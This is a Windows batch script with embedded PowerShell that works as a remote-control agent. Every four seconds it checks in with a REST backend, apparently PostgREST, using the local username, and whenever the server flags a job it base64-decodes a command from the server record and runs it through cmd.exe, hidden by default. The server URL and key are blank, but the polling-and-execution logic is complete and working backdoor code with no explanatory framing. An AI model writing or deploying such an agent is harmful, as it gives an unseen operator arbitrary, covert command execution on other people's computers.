@echo off
setlocal enabledelayedexpansion

set "BASE_URL="
set "API_KEY="

:main
powershell -Command "$h = @{ 'apikey' = '!API_KEY!'; 'Authorization' = 'Bearer !API_KEY!'; 'Content-Type' = 'application/json'; 'Prefer' = 'return=representation'; 'Accept' = 'application/vnd.pgrst.object+json' }; $u = '!BASE_URL!/clients?username=eq.!USERNAME!'; $r = Invoke-RestMethod -Method Patch -Uri $u -Headers $h -Body '{\"updated_at\": \"now()\"}'; if ($r.run -eq $true) { Invoke-RestMethod -Method Patch -Uri $u -Headers $h -Body '{\"run\": false}'; $c = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($r.cmd)); $s = if ($r.visible -eq $true) { 'Normal' } else { 'Hidden' }; Start-Process cmd.exe -ArgumentList '/c', $c -WindowStyle $s; }"
timeout /t 4 /nobreak >nul
goto main
